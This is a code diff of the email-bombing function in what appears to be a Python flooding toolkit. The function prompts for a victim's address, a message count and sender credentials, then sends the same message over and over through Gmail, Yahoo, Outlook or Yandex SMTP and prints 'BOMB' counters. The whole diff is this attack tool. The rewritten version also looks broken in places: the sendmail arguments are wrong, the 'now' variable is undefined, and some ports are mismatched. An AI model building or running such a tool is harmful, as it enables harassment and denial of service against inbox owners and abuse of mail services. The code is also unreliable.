@@ -9379,85 +9379,38 @@ def emailbomber():
 ╚═══╩╝╚╝╚╩╝ ╚╩══╩═══╝\n'''))
 
 	try:
-		class Email_Bomber:
-			count = 0
+		TO = str(input('Enter target email: '))
+		amount=int(input("How many send: "))
+		SUBJECT = str(input('Enter subject: '))
+		TEXT = str(input('Enter message: '))
+		mail_user = str(input('Enter from address: '))
+		mail_pwd = str(input('Enter from password: '))
+		server = input('Enter email server or select premade options - 1:Gmail 2:Yahoo 3:Outlook 4:Yandex: ')
+		if server == '1':
+			server = smtplib.SMTP('smtp.gmail.com', 587)
+			server.starttls()
+		elif server == '2':
+			server = smtplib.SMTP('smtp.mail.yahoo.com', 465)
+			server.starttls()
+		elif server == '3':
+			server = smtplib.SMTP('smtp-mail.outlook.com', 587)
+			server.starttls()
+		elif server == '4':
+			server = smtplib.SMTP('smtp.yandex.ru', 465)
+			server.starttls()
 
-			def __init__(self):
-				try:
-					pb2()
-					self.target = str(input("Enter target email: "))
-				except:
-					print("\033[31m{}" .format('ERROR'))
-					ex()
+		server.login(mail_user, mail_pwd)
+		cnt=0
+		
+		for email in range(amount+1):
+			server.sendmail(mail_user, TO, SUBJECT, TEXT)
+			cnt+=1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(f'BOMB') + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'{cnt}') + "\033[37m {}" .format('|') + "\033[35m {}" .format(TO))
+		print("\033[32m {}" .format('\nAttack finished!'))
+		ex()
 
-			def bomb(self):
-				try:
-					self.amount = None
-					self.amount = int(input('Enter the number of bombs: '))
-				except:
-					print("\033[31m{}" .format('ERROR'))
-					ex()
-
-			def email(self):
-				try:
-					self.server = str(input('Enter email server or select premade options - 1:Gmail 2:Yahoo 3:Outlook 4:Yandex: '))
-					premade = ['1', '2', '3', '4']
-					default_port = True
-					if self.server not in premade:
-						default_port = False
-						self.port = int(input('Enter port number: '))
-
-					if default_port == True:
-						self.port = int(587)
-
-					if self.server == '1':
-						self.server = 'smtp.gmail.com'
-					elif self.server == '2':
-						self.server = 'smtp.mail.yahoo.com'
-					elif self.server == '3':
-						self.server = 'smtp-mail.outlook.com'
-					elif self.server == '4':
-						self.server = 'smtp.yandex.ru'
-
-					self.fromAddr = str(input('Enter from address: '))
-					self.fromPwd = str(input('Enter from password: '))
-					self.subject = str(input('Enter subject: '))
-					self.message = str(input('Enter message: '))
-
-					self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
-					''' % (self.fromAddr, self.target, self.subject, self.message)
-
-					self.s = smtplib.SMTP(self.server, self.port)
-					self.s.ehlo()
-					self.s.starttls()
-					self.s.ehlo()
-					self.s.login(self.fromAddr, self.fromPwd)
-				except:
-					print("\033[31m{}" .format('ERROR'))
-					ex()
-
-			def send(self):
-				now = datetime.datetime.now()
-				self.s.sendmail(self.fromAddr, self.target, self.msg)
-				self.count +=1
-				print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(f'BOMB') + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'{self.count}') + "\033[37m {}" .format('|') + "\033[35m {}" .format(self.target))
-				
-
-			def attack(self):
-				print("")
-				for email in range(self.amount+1):
-					self.send()
-				self.s.close()
-				print("\033[32m {}" .format('\nAttack finished!'))
-				ex()
-
-		if __name__=='__main__':
-			bomb = Email_Bomber()
-			bomb.bomb()
-			bomb.email()
-			bomb.attack()
 	except:
-		print("\033[31m{}" .format('\nERROR!'))
+		print("\033[31m{}" .format('ERROR!'))
 		ex()
 
 def smsbomber():
